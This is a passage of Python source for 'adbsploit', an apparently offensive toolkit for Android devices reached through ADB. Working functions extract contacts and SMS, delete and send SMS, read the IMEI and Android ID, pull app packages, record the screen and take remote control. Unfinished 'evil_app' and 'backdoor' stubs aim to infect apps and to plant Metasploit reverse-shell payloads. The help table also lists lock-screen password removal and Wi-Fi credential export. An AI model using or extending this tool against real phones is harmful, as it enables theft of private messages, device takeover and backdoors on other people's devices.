            d = adbutils.adb.device(device)
            print(arrow + Fore.GREEN + d.shell("ps -ef"))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred listing the processes..").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def tcpip():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the port").format(Fore.RED, Fore.WHITE))
            port = my_input(arrow + " adbsploit" + Fore.RED + "(tcpip) " + Fore.WHITE + "> ")
            if port == '':
                print(Fore.RED + "You must specify a port to listen on your device...")
            else:
                os.system("adb -s " + device + " tcpip " + port)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred enabling the tcpip mode..").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


# TODO
def extract_contacts():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
            d = adbutils.adb.device(device)
            output = d.shell("content query --uri content://contacts/phones/  --projection display_name:number:notes ")
            print(output)
            d.shell("content query --uri content://contacts/phones/  --projection display_name:number:notes ")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred extracting the contacts...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def extract_sms():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
            d = adbutils.adb.device(device)
            output = d.shell("content query --uri content://sms/ --projection _id:address:date:body")
            print(output)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred extracting sms...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

#todo
def delete_sms():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
            d = adbutils.adb.device(device)
            print(arrow + ("[{0}+{1}] Specify row id").format(Fore.RED, Fore.WHITE))
            row = my_input(arrow + " adbsploit" + Fore.RED + "(delete-sms) " + Fore.WHITE + "> ")
            d.shell("content delete --uri content://sms/ --where" + '"row=' + "'" + row + "'" + '"')
            print('SMS Deleted')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred deleting the sms...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def send_sms():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
            d = adbutils.adb.device(device)
            print(arrow + ("[{0}+{1}] Specify the phone number (+34600112233)").format(Fore.RED, Fore.WHITE))
            number = my_input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the sms message").format(Fore.RED, Fore.WHITE))
            message = my_input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
            d.shell(
                "service call isms 7 i32 0 s16 " + "com.android.mms.service " + "s16 " + '"' + number + '"' + " s16 " + '"null"' + " s16 " + '"' + message + '"' + ' s16 "null" s16 "null"')
            print(arrow + Fore.GREEN + 'SMS Sent correctly...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred sending the sms...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


# TODO
def current_app():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + Fore.GREEN + d.current_app())
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the current app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

def device_info():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + "Product Model: "+ Fore.GREEN + d.shell("getprop ro.product.model"))
            print(arrow + "Android Version: " + Fore.GREEN + d.shell("getprop ro.build.version.release"))
            print(arrow + "Android Id: " + Fore.GREEN + d.shell("settings get secure android_id"))
            print(arrow + "IMEI: " + Fore.GREEN + d.shell("service call iphonesubinfo 1"))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the current app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

def recovery_mode():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell("reboot recovery")
            print(arrow+Fore.GREEN+"Entering in recovery mode...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred entering in recovery mode...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

def fastboot_mode():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell("reboot bootloader")
            print(arrow+Fore.GREEN+"Entering in fastboot mode...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred entering in fastboot mode...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

def kill_process():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + ("[{0}+{1}] Specify the PID").format(Fore.RED, Fore.WHITE))
            pid = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
            d.shell("taskkill /PID "+ pid)
            print(arrow+Fore.GREEN+"Killing the process...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred killing the process...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

def extract_app():
    global device
    app = 'com.whatsapp'
    d = adbutils.adb.device(device)
    path = d.shell("pm path " + app)
    d.shell("pull " + path[8:])

def screenrecord():
    global device
    if device != 'none':
        print(arrow + ("[{0}+{1}] Introduce the path and file name: (/home/user/Desktop/record.mp4)").format(Fore.RED, Fore.WHITE))
        ans = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
        try:
            if sys.platform.startswith('win32'):
                if shutil.which("scrcpy") is not None:
                    if ans == "":
                        subprocess.Popen(['scrcpy -r record.mp4 -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )
                    else:
                        subprocess.Popen(['scrcpy -r ' + ans + ' -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )

                else:
                    print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control").format(Fore.RED, Fore.WHITE))
                    print(arrow + (
                        "[{0}+{1}] You must install it from https://github.com/Genymobile/scrcpy/releases").format(
                        Fore.RED, Fore.WHITE))

            elif sys.platform.startswith('linux'):
                if shutil.which("scrcpy") is not None:
                    if ans == "":
                        subprocess.Popen(['scrcpy -r record.mp4 -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )
                    else:
                        subprocess.Popen(['scrcpy -r ' + ans + ' -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )
                else:
                    print(arrow + (
                        "[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(
                        Fore.RED, Fore.WHITE))
                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                    if ans == "y" or ans == "Y":
                        subprocess.Popen('sudo apt-get install scrcpy', shell=True)
                    elif ans == "n" or ans == "N":
                        print(arrow + (
                            "[{0}+{1}] Continue with ADBSploit...").format(
                            Fore.RED, Fore.WHITE))
                    else:
                        print(arrow + (
                            "[{0}+{1}] The option is incorrect please try again").format(
                            Fore.RED, Fore.WHITE))
            elif sys.platform.startswith('darwin'):
                if shutil.which("scrcpy") is not None:
                    if ans == "":
                        subprocess.Popen(['scrcpy -r record.mp4 -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )
                    else:
                        subprocess.Popen(['scrcpy -r ' + ans + ' -s ' + device],
                                         shell=True,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, )
                else:
                    print(arrow + (
                        "[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(
                        Fore.RED, Fore.WHITE))
                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                    if ans == "y" or ans == "Y":
                        subprocess.call(
                            '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"',
                            shell=True)
                        subprocess.call('brew install scrcpy', shell=True)
                    elif ans == "n" or ans == "N":
                        print(arrow + (
                            "[{0}+{1}] Continue with ADBSploit...").format(
                            Fore.RED, Fore.WHITE))
                    else:
                        print(arrow + (
                            "[{0}+{1}] The option is incorrect please try again").format(
                            Fore.RED, Fore.WHITE))
            else:
                print(arrow + ("[{0}+{1}] An error ocurred streaming the screen...").format(Fore.RED, Fore.WHITE))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred streaming the screen...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def remote_control():
    global device
    if device != 'none':
        try:
            if sys.platform.startswith('win32'):
                if shutil.which("scrcpy") is not None:
                    subprocess.Popen(['scrcpy -s ' + device],
                                            shell=True,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT,)
                else:
                    print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control").format(Fore.RED, Fore.WHITE))
                    print(arrow + ("[{0}+{1}] You must install it from https://github.com/Genymobile/scrcpy/releases").format(Fore.RED, Fore.WHITE))

            elif sys.platform.startswith('linux'):
                if shutil.which("scrcpy") is not None:
                    subprocess.Popen(['scrcpy -s ' + device],
                                            shell=True,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT,)
                else:
                    print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(Fore.RED, Fore.WHITE))
                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                    if ans == "y" or ans == "Y":
                        subprocess.Popen('sudo apt-get install scrcpy',shell=True)
                    elif ans == "n" or ans == "N":
                        print(arrow + (
                            "[{0}+{1}] Continue with ADBSploit...").format(
                            Fore.RED, Fore.WHITE))
                    else:
                        print(arrow + (
                            "[{0}+{1}] The option is incorrect please try again").format(
                            Fore.RED, Fore.WHITE))
            elif sys.platform.startswith('darwin'):
                if shutil.which("scrcpy") is not None:
                    subprocess.Popen(['scrcpy -s ' + device],
                                            shell=True,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT,)
                else:
                    print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(Fore.RED, Fore.WHITE))
                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                    if ans == "y" or ans == "Y":
                        subprocess.call('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"',shell=True)
                        subprocess.call('brew install scrcpy', shell=True)
                    elif ans == "n" or ans == "N":
                        print(arrow + (
                            "[{0}+{1}] Continue with ADBSploit...").format(
                            Fore.RED, Fore.WHITE))
                    else:
                        print(arrow + (
                            "[{0}+{1}] The option is incorrect please try again").format(
                            Fore.RED, Fore.WHITE))
            else:
                print(arrow + ("[{0}+{1}] An error ocurred streaming the screen...").format(Fore.RED, Fore.WHITE))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred streaming the screen...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))
#TODO
def evil_app():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + ("[{0}+{1}] Specify the App you want to infect: (com.whatsapp)").format(Fore.RED, Fore.WHITE))
            app = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
            path = d.shell("pm path " + app)
            d.shell("pull " + path[8:])


        except:
            print(arrow + ("[{0}+{1}] An error ocurred killing the process...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))
#TODO
def backdoor():
    global device
    if device != 'none':
        if shutil.which("msfvenom") is not None:
            try:
                d = adbutils.adb.device(device)
                print(arrow + ("[{0}+{1}] Specify the payload: (com.whatsapp)").format(Fore.RED, Fore.WHITE))
                table = Table()
                table.add_column("Name", style="cyan")
                table.add_column("Description", style="magenta")
                table.add_row("meterpreter_reverse_http", "Android Meterpreter Reverse HTTP Stager")
                table.add_row("meterpreter_reverse_https", "Android Meterpreter Reverse HTTPS Stager")
                table.add_row("meterpreter_reverse_tcp", "Android Meterpreter Reverse TCP Stager")
                table.add_row("meterpreter_reverse_http_inline", "Android Meterpreter Reverse HTTP Inline")
                table.add_row("meterpreter_reverse_https_inline", "Android Meterpreter Reverse HTTPS Inline")
                table.add_row("meterpreter_reverse_tcp_inline", "Android Meterpreter Reverse TCP Inline")
                table.add_row("shell_reverse_http", "Android Command Shell Reverse HTTP Stager")
                table.add_row("shell_reverse_https", "Android Command Shell Reverse HTTP Stager")
                table.add_row("shell_reverse_tcp", "Android Command Shell Reverse HTTP Stager")
                console = Console()
                console.print(table)
                print(arrow + ("[{0}+{1}] Specify the payload: (meterpreter_reverse_http)").format(Fore.RED, Fore.WHITE))
                payload = my_input(arrow + " adbsploit" + Fore.RED + "(backdoor) " + Fore.WHITE + "> ")
                if payload == "":
                    print()
                elif payload == "meterpreter_reverse_http":
                    print()
                elif payload == "meterpreter_reverse_https":
                    print()
                elif payload == "meterpreter_reverse_tcp":
                    print()
                elif payload == "meterpreter_reverse_http_inline":
                    print()
                elif payload == "meterpreter_reverse_https_inline":
                    print()
                elif payload == "meterpreter_reverse_tcp_inline":
                    print()
                elif payload == "shell_reverse_http":
                    print()
                elif payload == "shell_reverse_httpS":
                    print()
                elif payload == "shell_reverse_TCP":
                    print()
                else:
                    print(arrow + ("[{0}+{1}] Select a correct payload...").format(Fore.RED, Fore.WHITE))
            except:
                print(arrow + ("[{0}+{1}] An error ocurred generating the backdoor...").format(Fore.RED, Fore.WHITE))
        else:
            print(arrow + ("[{0}+{1}] ADBSploit use Metasploit for generating backdoors, you must install to use this option").format(
                Fore.RED, Fore.WHITE))
            print(arrow + (
                "[{0}+{1}] Install it via https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers ").format(
                Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))


def clear():
    if sys.platform.startswith('win32'):
        os.system('cls')
    elif sys.platform.startswith('linux'):
        os.system('clear')
    elif sys.platform.startswith('darwin'):
        os.system('clear')

    f = Figlet()
    list = ["graffiti", "slant", "avatar", "bell", "big", "doom",
            "standard", "stop"]
    f.setFont(font=random.choice(list))
    print(f.renderText('>_adbsploit'))
    print("v0.3" + "\t \t \t \t" + "Developed by MesQ at " + Fore.RED + "https://github.com/mesquidar/adbsploit ")
    print("")
    print(Fore.WHITE + "Type" + Fore.RED + " help " + Fore.WHITE + "for more info")


def version():
    """Show the version of the tool"""
    table = Table()
    table.add_column("Version", style="cyan")
    table.add_column("URL", style="magenta")
    table.add_column("Developed", style="magenta")
    table.add_row('0.2.1', "https://github.com/mesquidar/adbsploit", 'MesQ')
    console = Console()
    console.print(table)


def help():
    table = Table()
    table.add_column("Command", style="cyan")
    table.add_column("Description", style="magenta")
    table.add_column("Command", style="cyan")
    table.add_column("Description", style="magenta")
    table.add_row('devices', 'List all devices detected', 'select', 'Select the device to use')
    table.add_row('connect', 'Connect to the device', 'list-forward', 'List forward ports')
    table.add_row('wifi', 'Manage the wifi of the device', 'start-app', 'Start an app')
    table.add_row('stop-app', 'Stop an app', 'clear-app', 'Clear cache of the app')
    table.add_row('airplane', 'Manage the airplane mode', 'dumpsys', 'Provide info about system services (Needs Root)')
    table.add_row('list-apps', 'List all apps installed', 'wpa-supplicant',
                  'Export the wpa-supplicant file (Needs Root)')
    table.add_row('install', 'Install an apk', 'install-remote', 'Install an app via URL')
    table.add_row('uninstall', 'Uninstall an app', 'shell', 'Open a shell on the device')
    table.add_row('shutdown', 'Shutdown the device', 'reboot', 'Reboot the device')
    table.add_row('logs', 'List the logs of the device', 'show-ip', 'Show the ip of the device')
    table.add_row('appinfo', 'Obtain info of the package', 'battery', 'Show battery info')
    table.add_row('netstat', 'Show the netstat of the device', 'sound', 'Control teh sound of the device')
    table.add_row('check-screen', 'Check the status of the screen', 'dump-hierarchy', 'Dump the hierarchy info')
    table.add_row('keyevent', 'Send a keyevent to the device', 'show-keyevents', 'Show the keyevents')
    table.add_row('open-browser', 'Open a URL in the device', 'remove-password',
                  'Remove the lock screen password (Needs Root))')
    table.add_row('swipe', 'Swipe the screen', 'screen', 'Change the screen status ON/OFF')
    table.add_row('unlock-screen', 'Unlock the screen of the device', 'lock-screen', 'Lock the screen of the device')
    table.add_row('show-mac', 'Show teh mac address of the device', 'dump-meminfo', 'Dump de memory info of the device')
    table.add_row('process-list', 'List all the device process', 'tcpip', 'Change the device to tcp')
    table.add_row('extract-app', 'Extract the apk of an installed app', 'extract-contacts',
                  'Show the contacts saved in the device')
    table.add_row('extract-sms', 'Extract sms saved in the phone', 'delete-sms', 'Delete the sms specified')
    table.add_row('send-sms', 'Send sms to the specified phone', 'recovery-mode', 'Enter the device in recovery mode')
    table.add_row('fastboot-mode', 'Enter in fastboot mode', 'device-info', 'Get device info (IMEI, Android Id,...)')
    table.add_row('kill-process', 'Kill the process on the device', 'screenrecord', 'Records the device screen')
    table.add_row('remote-control', 'Take control of the target device', '', '')
    table.add_row('clear', 'Clear the screen of adbsploit', 'version', 'Show the version of adbsploit')
    table.add_row('exit', 'Exit adbsploit', '', '')
    console = Console()
    console.print(table)


# **************************************************************************************
# Run script
if __name__ == '__main__':
    f = Figlet()
    list = ["graffiti", "slant", "avatar", "bell", "big", "doom",
            "standard", "stop"]
    f.setFont(font=random.choice(list))
    print(f.renderText('>_adbsploit'))
    print("v0.2.2" + "\t \t \t \t" + "Developed by MesQ at " + Fore.RED + "https://github.com/mesquidar/adbsploit ")
    print("")
    print(Fore.WHITE + "Type" + Fore.RED + " help " + Fore.WHITE + "for more info")
    main()
